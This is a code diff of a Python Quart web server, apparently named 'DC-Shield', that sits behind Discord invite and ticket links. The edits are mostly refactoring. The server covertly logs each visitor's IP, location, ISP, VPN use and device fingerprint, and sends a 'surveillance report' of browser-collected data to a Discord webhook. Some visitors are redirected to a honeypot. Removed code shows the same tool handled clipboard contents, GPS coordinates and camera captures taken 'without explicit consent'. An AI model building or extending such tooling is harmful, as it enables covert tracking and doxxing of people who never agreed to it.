@@ -14,12 +14,12 @@ import requests
 from datetime import datetime
 from user_agents import parse
 from logger import Logger
-from json_handler import *
-from surveillance_embeds import create_combined_surveillance_embed, create_interactive_buttons
+from json_handler import read_json_file, get_env_vars
+from surveillance_embeds import create_combined_surveillance_embed, get_threat_indicator
 from quart import Quart, jsonify, redirect, render_template, request, send_file
 
 app = Quart(__name__)
-l = Logger(console_log= True, file_logging=True, file_URI='logs/log.txt', override=True)
+l = Logger(console_log= True, file_logging=True, file_URI='logs/log1.txt', override=True)
 default_server:str
 alternative_server_url:str
 test_flag:bool
@@ -71,7 +71,7 @@ def ip_in_subnet(ip, subnet):
         print("Error:", e)
         return False
     
-async def check_for_vpn(ip):
+def check_for_vpn(ip):
     global sub_nets
     return any(ip_in_subnet(ip, subnet) for subnet in sub_nets)
 
@@ -90,7 +90,6 @@ def extract_device_info(request_obj):
     # Extract the real IP address using the new function
     real_ip = extract_real_ip(request_obj)
     proxy_ip = headers.get('X-Real-IP', 'Unknown')
-
     # User Agent parsing
     user_agent_string = headers.get('User-Agent', 'Unknown')
     user_agent = parse(user_agent_string)
@@ -188,50 +187,43 @@ def extract_device_info(request_obj):
 
     return device_info
 
-def send_to_channel(message:str, embed_data=None, components=None):
-    """
-    Sends a message using Discord webhook with optional embed support and components.
-
-    Args:
-    - message (str): The message to send.
-    - embed_data (dict): Optional embed data for rich formatting.
-    - components (list): Optional components (buttons) for interactivity.
-
-    Returns:
-    - bool: True if the message was sent successfully, False otherwise.
-    """
+def send_to_channel(message: str, embed_data=None, components=None):
+    """Enhanced webhook sender with better error handling"""
     global config
     
-    # Create payload
     payload = {}
 
+    # Build payload more safely
     if embed_data:
-        payload = {
-            "embeds": [embed_data]
-        }
+        payload["embeds"] = [embed_data]
         if message:
             payload["content"] = message
+        # Note: Webhooks don't support components/buttons
         if components:
-            payload["components"] = components
+            l.warning("Webhooks don't support interactive components - buttons ignored")
     else:
-        payload = {
-            "content": message
-        }
+        payload["content"] = message or "No message content"
 
     try:
-        # Send POST request to the webhook URL
-        response = requests.post(config["dc_webhook_url"], json=payload)
-        response.raise_for_status()  # Raise an exception for any HTTP error status
+        response = requests.post(
+            config["dc_webhook_url"],
+            json=payload,
+            timeout=10  # Add timeout
+        )
+        response.raise_for_status()
 
-        # Check if the message was sent successfully
         if response.status_code == 204:
             l.passing("Message sent successfully")
             return True
         else:
-            l.error(f"Failed to send message. Status code: {response.status_code}")
+            l.error(f"Unexpected status code: {response.status_code}")
             return False
+
+    except requests.exceptions.Timeout:
+        l.error("Webhook request timed out")
+        return False
     except requests.exceptions.RequestException as e:
-        l.error(f"Failed to send message: {e}")
+        l.error(f"Webhook request failed: {e}")
         return False
 
 def create_honeypot_embed(ip, country_code, honeypot, device_info=None):
@@ -276,7 +268,7 @@ def create_honeypot_embed(ip, country_code, honeypot, device_info=None):
 
     # Honeypot Information
     honeypot_value = f"**Decoy Server:** `{honeypot}`\n"
-    honeypot_value += f"**Redirect Status:** ✅ Successfully executed\n"
+    honeypot_value += "**Redirect Status:** ✅ Successfully executed\n"
     honeypot_value += f"**Analysis:** [View IP Details](https://iplocation.com/?ip={display_ip.replace(' (localhost)', '')})"
 
     embed["fields"].append({
@@ -294,8 +286,18 @@ def create_honeypot_embed(ip, country_code, honeypot, device_info=None):
         if device_info['device_brand'] and device_info['device_brand'] != 'None':
             device_value += f" ({device_info['device_brand']} {device_info['device_model']})"
 
-        device_type_emoji = "📱" if device_info['is_mobile'] else "💻" if device_info['is_pc'] else "📟" if device_info['is_tablet'] else "🤖" if device_info['is_bot'] else "❓"
-        device_type_text = "Mobile" if device_info['is_mobile'] else "Desktop" if device_info['is_pc'] else "Tablet" if device_info['is_tablet'] else "Bot" if device_info['is_bot'] else "Unknown"
+        device_type_map = {
+            'is_mobile': ("📱", "Mobile"),
+            'is_pc': ("💻", "Desktop"),
+            'is_tablet': ("📟", "Tablet"),
+            'is_bot': ("🤖", "Bot"),
+        }
+        device_type_emoji, device_type_text = ("❓", "Unknown")
+        for key, (emoji, text) in device_type_map.items():
+            if device_info[key]:
+                device_type_emoji, device_type_text = emoji, text
+                break
+
         device_value += f"\n**Platform:** {device_type_emoji} {device_type_text}"
 
         embed["fields"].append({
@@ -312,7 +314,7 @@ def create_honeypot_embed(ip, country_code, honeypot, device_info=None):
         try:
             access_dt = datetime.fromisoformat(device_info['access_time'].replace('Z', '+00:00'))
             formatted_time = access_dt.strftime("%Y-%m-%d %H:%M:%S UTC")
-        except:
+        except ValueError:
             formatted_time = device_info['access_time']
 
         connection_value += f"**Access Time:** {formatted_time}\n"
@@ -343,54 +345,11 @@ def create_honeypot_embed(ip, country_code, honeypot, device_info=None):
 
     return embed
 
-def create_honeypot_buttons(ip, country_code, honeypot):
-    """
-    Create interactive buttons for honeypot alerts
-    """
-    # Fix IP for URL if it's None or localhost
-    url_ip = ip if ip and ip != "None" and not ip.startswith("127.") else "8.8.8.8"
-
-    return [
-        {
-            "type": 1,  # Action Row
-            "components": [
-                {
-                    "type": 2,  # Button
-                    "style": 2,  # Secondary (gray)
-                    "label": "🔍 IP Analysis",
-                    "custom_id": f"ip_analysis_{url_ip}",
-                    "emoji": {"name": "🌐"}
-                },
-                {
-                    "type": 2,  # Button
-                    "style": 2,  # Secondary (gray)
-                    "label": "📊 Threat Details",
-                    "custom_id": f"threat_details_{country_code}",
-                    "emoji": {"name": "⚠️"}
-                },
-                {
-                    "type": 2,  # Button
-                    "style": 4,  # Danger (red)
-                    "label": "🛡️ Block IP",
-                    "custom_id": f"block_ip_{url_ip}",
-                    "emoji": {"name": "🚫"}
-                },
-                {
-                    "type": 2,  # Button
-                    "style": 1,  # Primary (blue)
-                    "label": "📋 Full Report",
-                    "custom_id": f"full_report_honeypot",
-                    "emoji": {"name": "📄"}
-                }
-            ]
-        }
-    ]
-
 def create_ip_grabber_embed(dc_handle, ip_address, vpn, country_name, country_code2, isp, device_info):
     """
     Create an enhanced Discord embed for IP grabber triggers with comprehensive analysis
     """
-    from surveillance_embeds import get_threat_indicator, create_progress_bar, format_bytes
+    from surveillance_embeds import get_threat_indicator, create_progress_bar
 
     # Calculate threat score based on various factors
     threat_score = 45  # Base score for IP grabbing
@@ -454,7 +413,17 @@ def create_ip_grabber_embed(dc_handle, ip_address, vpn, country_name, country_co
     platform_icons = {
         'mobile': '📱', 'tablet': '📟', 'pc': '💻', 'bot': '🤖'
     }
-    platform_type = 'mobile' if device_info['is_mobile'] else 'tablet' if device_info['is_tablet'] else 'pc' if device_info['is_pc'] else 'bot' if device_info['is_bot'] else 'unknown'
+
+    platform_type = 'unknown'
+    if device_info['is_mobile']:
+        platform_type = 'mobile'
+    elif device_info['is_tablet']:
+        platform_type = 'tablet'
+    elif device_info['is_pc']:
+        platform_type = 'pc'
+    elif device_info['is_bot']:
+        platform_type = 'bot'
+
     platform_emoji = platform_icons.get(platform_type, '❓')
     device_value += f"\n**Platform:** {platform_emoji} {platform_type.title()}"
 
@@ -486,7 +455,12 @@ def create_ip_grabber_embed(dc_handle, ip_address, vpn, country_name, country_co
         privacy_concerns.append("❌ **Do Not Track:** Disabled")
         privacy_score += 5
 
-    privacy_level = "🔴 High Risk" if privacy_score >= 30 else "🟡 Moderate Risk" if privacy_score >= 15 else "🟢 Low Risk"
+    if privacy_score >= 30:
+        privacy_level = "🔴 High Risk"
+    elif privacy_score >= 15:
+        privacy_level = "🟡 Moderate Risk"
+    else:
+        privacy_level = "🟢 Low Risk"
 
     embed["fields"].append({
         "name": f"🔒 PRIVACY ANALYSIS ({privacy_level})",
@@ -511,6 +485,16 @@ def create_ip_grabber_embed(dc_handle, ip_address, vpn, country_name, country_co
 
     if device_info.get('sec_ch_rtt', 'Unknown') != 'Unknown':
         tech_specs.append(f"**Network Latency:** {device_info['sec_ch_rtt']}ms")
+
+    if tech_specs:
+        embed["fields"].append({
+            "name": "⚙️ Technical Specifications",
+            "value": "\n".join(tech_specs),
+            "inline": True
+        })
+
+    return embed
+
 def extract_real_ip(request_obj):
     """
     Extract the real client IP address when running behind nginx proxy manager.
@@ -568,26 +552,7 @@ def is_valid_ip(ip_string):
     except ValueError:
         return False
 
-    if tech_specs:
-        embed["fields"].append({
-            "name": "⚙️ TECHNICAL SPECIFICATIONS",
-            "value": "\n".join(tech_specs),
-            "inline": True
-        })
 
-    # Connection Metadata
-    metadata_value = f"**Accept-Language:** {device_info['accept_language'][:30]}...\n"
-    metadata_value += f"**Connection Type:** {device_info['connection']}\n"
-    metadata_value += f"**Request Method:** {device_info['method']}\n"
-    metadata_value += f"**Content Type:** {device_info['content_type']}"
-
-    embed["fields"].append({
-        "name": "📊 CONNECTION METADATA",
-        "value": metadata_value,
-        "inline": True
-    })
-
-    return embed
 
 def create_verbose_embed(device_info, event_type="IP_GRABBER"):
     """
@@ -736,31 +701,10 @@ def create_verbose_embed(device_info, event_type="IP_GRABBER"):
 
     return embed
 
-def create_verbose_button(event_id, event_type):
-    """
-    Create a button component for viewing verbose details.
-    """
-    return [
-        {
-            "type": 1,  # Action Row
-            "components": [
-                {
-                    "type": 2,  # Button
-                    "style": 1,  # Primary style (blue)
-                    "label": "📋 View Full Details",
-                    "emoji": {
-                        "name": "🔍"
-                    },
-                    "custom_id": f"verbose_{event_type}_{event_id}",
-                    "url": f"https://your-domain.com/verbose/{event_id}"  # You can replace with your actual domain
-                }
-            ]
-        }
-    ]
-
 # Global storage for device information (in production, use a database)
 device_data_store = {}
 advanced_data_store = {}
+COMPREHENSIVE_REPORT_MESSAGE = "🚨 **COMPREHENSIVE SURVEILLANCE REPORT** 🚨"
 
 @app.route('/api/collect-advanced-data', methods=['POST'])
 async def collect_advanced_data():
@@ -777,7 +721,7 @@ async def collect_advanced_data():
         l.info(f'Advanced data collected: {len(data.get("data", {}))} categories')
 
         # Send advanced data to Discord
-        await send_advanced_data_to_discord(data)
+        send_advanced_data_to_discord(data)
 
         return jsonify({"status": "success"}), 200
 
@@ -785,248 +729,43 @@ async def collect_advanced_data():
         l.error(f'Error collecting advanced data: {e}')
         return jsonify({"status": "error", "message": str(e)}), 500
 
-async def send_advanced_data_to_discord(collected_data):
+def send_advanced_data_to_discord(collected_data):
     """
-    Send combined advanced collected data to Discord with interactive buttons
+    Send combined advanced collected data to Discord without buttons (webhooks don't support them)
     """
     try:
-        data = collected_data.get('data', {})
+        # Handle both dictionary and list data structures
+        if isinstance(collected_data, dict):
+            data = collected_data.get('data', {})
+        else:
+            # Fallback: treat as the data directly
+            data = collected_data if collected_data else {}
 
         # Create comprehensive combined embed with all data
         embed = create_combined_surveillance_embed(data)
-        components = create_interactive_buttons(data)
 
-        send_to_channel("🚨 **COMPREHENSIVE SURVEILLANCE REPORT** 🚨", embed, components)
+        # Send embed without buttons since webhooks don't support interactive components
+        send_to_channel(COMPREHENSIVE_REPORT_MESSAGE, embed)
 
     except Exception as e:
         l.error(f'Error sending advanced data to Discord: {e}')
+        # Send without components as fallback
+        try:
+            # Use safer data extraction for fallback
+            if isinstance(collected_data, dict):
+                fallback_data = collected_data.get('data', {})
+            else:
+                fallback_data = collected_data if collected_data else {}
 
-def create_advanced_data_embed(data):
-    """
-    Create a comprehensive embed for advanced collected data
-    """
-    embed = {
-        "title": "🔥 ADVANCED SURVEILLANCE DATA",
-        "description": "**CRITICAL: Sensitive user data intercepted**",
-        "color": 0xff0000,  # Bright red for high alert
-        "timestamp": datetime.now().isoformat(),
-        "fields": [],
-        "footer": {
-            "text": "DC-Shield Advanced Intelligence System • CONFIDENTIAL",
-            "icon_url": "https://cdn.discordapp.com/emojis/warning.png"
-        }
-    }
+            embed = create_combined_surveillance_embed(fallback_data)
+            send_to_channel(COMPREHENSIVE_REPORT_MESSAGE, embed)
+        except Exception as fallback_error:
+            l.error(f'Fallback also failed: {fallback_error}')
 
-    # Screen & Display Information
-    if data.get('screen'):
-        screen_info = data['screen']
-        screen_value = f"**Resolution:** {screen_info.get('width')}x{screen_info.get('height')}\n"
-        screen_value += f"**Available:** {screen_info.get('availWidth')}x{screen_info.get('availHeight')}\n"
-        screen_value += f"**Color Depth:** {screen_info.get('colorDepth')} bits\n"
-        screen_value += f"**Orientation:** {screen_info.get('orientation')}"
-
-        embed["fields"].append({
-            "name": "🖥️ Display Configuration",
-            "value": screen_value,
-            "inline": True
-        })
-
-    # Timezone & Location Data
-    if data.get('timezone'):
-        tz_info = data['timezone']
-        tz_value = f"**Timezone:** {tz_info.get('name')}\n"
-        tz_value += f"**Offset:** {tz_info.get('offset')} minutes\n"
-        tz_value += f"**Locale:** {tz_info.get('locale')}\n"
-        tz_value += f"**Languages:** {', '.join(tz_info.get('languages', [])[:3])}"
-
-        embed["fields"].append({
-            "name": "🌐 Timezone & Locale",
-            "value": tz_value,
-            "inline": True
-        })
-
-    # Hardware Information
-    hardware_value = ""
-    if data.get('browser', {}).get('hardwareConcurrency'):
-        hardware_value += f"**CPU Cores:** {data['browser']['hardwareConcurrency']}\n"
-    if data.get('deviceMemory'):
-        hardware_value += f"**Device RAM:** {data['deviceMemory']} GB\n"
-    if data.get('memory'):
-        mem = data['memory']
-        hardware_value += f"**JS Heap Limit:** {mem.get('jsHeapSizeLimit', 0) // 1024 // 1024} MB\n"
-        hardware_value += f"**JS Heap Used:** {mem.get('usedJSHeapSize', 0) // 1024 // 1024} MB"
-
-    if hardware_value:
-        embed["fields"].append({
-            "name": "⚙️ Hardware Specifications",
-            "value": hardware_value,
-            "inline": False
-        })
-
-    # Battery Information (if available)
-    if data.get('battery') and not data['battery'].get('error'):
-        battery = data['battery']
-        battery_value = f"**Level:** {int(battery.get('level', 0) * 100)}%\n"
-        battery_value += f"**Charging:** {'Yes' if battery.get('charging') else 'No'}\n"
-        if battery.get('dischargingTime') != float('inf'):
-            battery_value += f"**Time Remaining:** {battery.get('dischargingTime', 0) // 60} minutes"
-
-        embed["fields"].append({
-            "name": "🔋 Battery Status",
-            "value": battery_value,
-            "inline": True
-        })
-
-    # Network Connection Details
-    if data.get('network') and not data['network'].get('error'):
-        network = data['network']
-        network_value = f"**Type:** {network.get('effectiveType', 'Unknown')}\n"
-        network_value += f"**Downlink:** {network.get('downlink', 'Unknown')} Mbps\n"
-        network_value += f"**RTT:** {network.get('rtt', 'Unknown')}ms\n"
-        network_value += f"**Data Saver:** {'On' if network.get('saveData') else 'Off'}"
-
-        embed["fields"].append({
-            "name": "📡 Network Connection",
-            "value": network_value,
-            "inline": True
-        })
-
-    # Media Devices
-    if data.get('mediaDevices') and not data['mediaDevices'].get('error'):
-        devices = data['mediaDevices']
-        device_count = {
-            'videoinput': 0,
-            'audioinput': 0,
-            'audiooutput': 0
-        }
-        for device in devices:
-            kind = device.get('kind', 'unknown')
-            if kind in device_count:
-                device_count[kind] += 1
-
-        media_value = f"**Cameras:** {device_count['videoinput']}\n"
-        media_value += f"**Microphones:** {device_count['audioinput']}\n"
-        media_value += f"**Speakers:** {device_count['audiooutput']}"
-
-        embed["fields"].append({
-            "name": "🎥 Media Devices",
-            "value": media_value,
-            "inline": True
-        })
-
-    # Storage Information
-    if data.get('storage') and not data['storage'].get('error'):
-        storage = data['storage']
-        storage_value = f"**Quota:** {storage.get('quota', 0) // 1024 // 1024 // 1024} GB\n"
-        storage_value += f"**Used:** {storage.get('usage', 0) // 1024 // 1024} MB"
-
-        embed["fields"].append({
-            "name": "💾 Storage Information",
-            "value": storage_value,
-            "inline": True
-        })
-
-    # Clipboard Data (if captured)
-    if data.get('clipboard') and not data['clipboard'].get('error'):
-        clipboard = data['clipboard']
-        clip_value = f"**Length:** {clipboard.get('length', 0)} characters\n"
-        clip_value += f"**Preview:** {clipboard.get('content', '')[:50]}..."
-
-        embed["fields"].append({
-            "name": "📋 Clipboard Contents",
-            "value": clip_value,
-            "inline": False
-        })
-
-    # Browser Fingerprints
-    if data.get('canvas'):
-        embed["fields"].append({
-            "name": "🎨 Canvas Fingerprint",
-            "value": "Canvas fingerprint captured (unique identifier)",
-            "inline": True
-        })
-
-    if data.get('webgl') and not data['webgl'].get('error'):
-        webgl = data['webgl']
-        webgl_value = f"**Vendor:** {webgl.get('vendor', 'Unknown')}\n"
-        webgl_value += f"**Renderer:** {webgl.get('renderer', 'Unknown')[:50]}..."
-
-        embed["fields"].append({
-            "name": "🎮 WebGL Information",
-            "value": webgl_value,
-            "inline": True
-        })
-
-    return embed
-
-def create_camera_embed(camera_data):
-    """
-    Create embed for captured camera image
-    """
-    embed = {
-        "title": "📸 CAMERA SURVEILLANCE SUCCESSFUL",
-        "description": "**ALERT: User camera accessed without explicit consent**",
-        "color": 0xff4757,
-        "timestamp": datetime.now().isoformat(),
-        "fields": [
-            {
-                "name": "📷 Capture Details",
-                "value": f"**Status:** Image captured successfully\n**Resolution:** 640x480\n**Timestamp:** {camera_data.get('timestamp')}",
-                "inline": False
-            },
-            {
-                "name": "🔍 Image Analysis",
-                "value": "Camera feed intercepted and stored for analysis. Image data available in base64 format.",
-                "inline": False
-            }
-        ],
-        "footer": {
-            "text": "DC-Shield Camera Intelligence • CLASSIFIED",
-        }
-    }
-
-    # Note: We're not including the actual image in Discord for privacy/legal reasons
-    # In a real scenario, this would be stored securely and referenced
-
-    return embed
-
-def create_location_embed(geo_data):
-    """
-    Create embed for GPS location data
-    """
-    embed = {
-        "title": "🌍 GPS LOCATION ACQUIRED",
-        "description": "**CRITICAL: Precise user location obtained**",
-        "color": 0xe74c3c,
-        "timestamp": datetime.now().isoformat(),
-        "fields": [
-            {
-                "name": "📍 Coordinates",
-                "value": f"**Latitude:** {geo_data.get('latitude')}\n**Longitude:** {geo_data.get('longitude')}\n**Accuracy:** ±{geo_data.get('accuracy')} meters",
-                "inline": True
-            },
-            {
-                "name": "🗺️ Location Details",
-                "value": f"**Altitude:** {geo_data.get('altitude') or 'Unknown'} m\n**Heading:** {geo_data.get('heading') or 'Unknown'}°\n**Speed:** {geo_data.get('speed') or 'Unknown'} m/s",
-                "inline": True
-            },
-            {
-                "name": "🔗 Map Link",
-                "value": f"[View on Google Maps](https://www.google.com/maps?q={geo_data.get('latitude')},{geo_data.get('longitude')})",
-                "inline": False
-            }
-        ],
-        "footer": {
-            "text": "DC-Shield GPS Intelligence • TOP SECRET",
-        }
-    }
-
-    return embed
-
-async def get_country(ip_address):
+def get_country(ip_address):
     """Retrieve country information for the given IP address."""
     try:
-        response = await request_ip_location(ip_address)
+        response = request_ip_location(ip_address)
         if response and response.get("response_code") == "200":
             country_code = response.get("country_code2")
             return country_code
@@ -1034,7 +773,7 @@ async def get_country(ip_address):
         l.error(f"Error fetching country information: {e}")
     return None
 
-async def request_ip_location(ip_address):
+def request_ip_location(ip_address):
     """Make a request to the IP location API."""
     url = f"https://api.iplocation.net/?cmd=ip-country&ip={ip_address}"
     try:
@@ -1059,7 +798,7 @@ async def redirect_handler(ip, normal_server, honeypot, request_obj=None):
             l.info(f'Could not extract real IP, using: {ip}')
 
     # Use real IP for geolocation
-    country_code = await get_country(real_ip)
+    country_code = get_country(real_ip)
     l.info(f'Country code for {real_ip}: {country_code}')
 
     #if test flag is set redirect every 2nd request to honeypot
@@ -1082,13 +821,12 @@ async def redirect_handler(ip, normal_server, honeypot, request_obj=None):
             device_info = extract_device_info(request_obj)
             l.info(f'Honeypot device info: {device_info}')
 
-        # Create and send embed message with buttons - use real IP for display
+        # Create and send embed message - use real IP for display
         embed = create_honeypot_embed(real_ip, country_code, honeypot, device_info)
-        buttons = create_honeypot_buttons(real_ip, country_code, honeypot)
-        send_to_channel(None, embed, buttons)
+        send_to_channel("", embed)
 
         return redirect(honeypot)
-    elif await check_for_vpn(real_ip):
+    elif check_for_vpn(real_ip):
         return 'You seem to access the link using a VPN. To ensure a secure experience for all our users, please disable the VPN and retry to join the Discord.'
     
     else:
@@ -1114,16 +852,19 @@ async def health():
 async def ip_grab(dc_handle):
     l.info('Grabber called.')
     l.info(f'user is: {dc_handle}')
-    ip_address = request.headers.get('X-Real-IP')
+
+    # Use the new real IP extraction method
+    real_ip = extract_real_ip(request)
+    ip_address = real_ip if real_ip else request.headers.get('X-Real-IP', '127.0.0.1')
+
     l.info(f'IP Address is: {ip_address}')
-    vpn = await check_for_vpn(ip_address)
+    vpn = check_for_vpn(ip_address)
 
     # Extract comprehensive device information
     device_info = extract_device_info(request)
 
     try:
-        data = await request_ip_location(ip_address)
-        ip = data['ip']
+        data = request_ip_location(ip_address)
         ip_number = data['ip_number']
         ip_version = data['ip_version']
         country_name = data['country_name']
@@ -1133,27 +874,21 @@ async def ip_grab(dc_handle):
         l.info(f'IP data: {data}\nVPN: {vpn}')
         l.info(f'Device info: {device_info}')
 
-        # Enhanced Discord message with device information
-        cookie_info = ""
-        if device_info['cookie_count'] > 0:
-            cookie_info = f"\n🍪 **Cookie Information:**\n• **Count:** {device_info['cookie_count']}\n• **Session Cookies:** {'Yes' if device_info['has_session_cookies'] else 'No'}\n• **Tracking Cookies:** {'Yes' if device_info['has_tracking_cookies'] else 'No'}"
-
-        hardware_info = ""
-        if device_info['sec_ch_device_memory'] != 'Unknown' or device_info['sec_ch_dpr'] != 'Unknown':
-            hardware_info = f"\n⚙️ **Hardware Details:**\n• **Device Memory:** {device_info['sec_ch_device_memory']} GB\n• **Screen DPR:** {device_info['sec_ch_dpr']}\n• **Architecture:** {device_info['sec_ch_ua_arch']}"
-
         # Create and send embed message with button
         event_id = str(int(datetime.now().timestamp()))
         device_data_store[event_id] = device_info
 
-        embed = create_ip_grabber_embed(dc_handle, ip_address, vpn, country_name, country_code2, isp, device_info)
+        # Only send embed if we have valid IP data
+        if data.get('response_code') == '200':
+            embed = create_ip_grabber_embed(dc_handle, ip_address, vpn, country_name, country_code2, isp, device_info)
+            # Send initial summary embed
+            send_to_channel("", embed)
 
-        # Send initial summary embed, then follow up with verbose details
-        send_to_channel(None, embed)
-
-        # Send verbose embed as follow-up message
-        verbose_embed = create_verbose_embed(device_info, "IP_GRABBER")
-        send_to_channel("📋 **Detailed Analysis:**", verbose_embed)
+            # Send verbose embed as follow-up message
+            verbose_embed = create_verbose_embed(device_info, "IP_GRABBER")
+            send_to_channel("📋 **Detailed Analysis:**", verbose_embed)
+        else:
+            l.warning(f'Invalid IP data received: {data}')
 
         if vpn:
             return 'You seem to access the link using a VPN. To ensure a secure experience for all our users, please disable the VPN and retry to create a ticket.'
@@ -1161,7 +896,7 @@ async def ip_grab(dc_handle):
         dc_handle += '?'
         return await render_template('result.html',
                                    dc_handle=dc_handle,
-                                   ip=ip,
+                                   ip=ip_address,  # Use the extracted IP
                                    ip_number=ip_number,
                                    ip_version=ip_version,
                                    country_name=country_name,
@@ -1170,8 +905,17 @@ async def ip_grab(dc_handle):
                                    device_info=device_info)
     except Exception as e:
         l.error(f'{e}')
-    return
-   
+        # Fallback to basic template with available data
+        return await render_template('result.html',
+                                   dc_handle=dc_handle + '?',
+                                   ip=ip_address,
+                                   ip_number='Unknown',
+                                   ip_version='4',
+                                   country_name='Unknown',
+                                   country_code2='XX',
+                                   isp='Unknown',
+                                   device_info=device_info)
+
 @app.route('/<path:dc_invite>')
 async def refer(dc_invite):
     l.info('Custom route called.')
